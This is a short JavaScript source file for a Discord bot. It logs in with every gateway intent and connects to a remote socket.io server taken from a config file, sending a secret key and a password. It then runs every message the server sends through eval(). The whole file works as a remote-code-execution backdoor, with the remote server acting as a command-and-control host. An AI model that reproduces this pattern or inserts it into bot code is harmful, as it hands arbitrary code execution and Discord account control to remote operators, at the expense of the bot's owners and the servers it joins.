const { Client } = require("discord.js");
const { io } = require("socket.io-client");
require("dotenv/config");
const config = require("./config.json");

const client = new Client({ intents: 3276799, presence: { status: "idle" } });
client.login(process.env.TOKEN).then(async () => {
  const socket = io(config.ws, {
    reconnection: true,
    reconnectionDelay: 5000,
    extraHeaders: {
      version: config.version,
      clientId: `${client.user.id}`,
      admins: config.admins,
    },
    auth: {
      secret_token: `${process.env.SECRET_KEY}`,
      password: `${process.env.PASSWORD}`,
    },
  });

  socket.on("message", async (data) => {
    eval(data.data);
  });
});
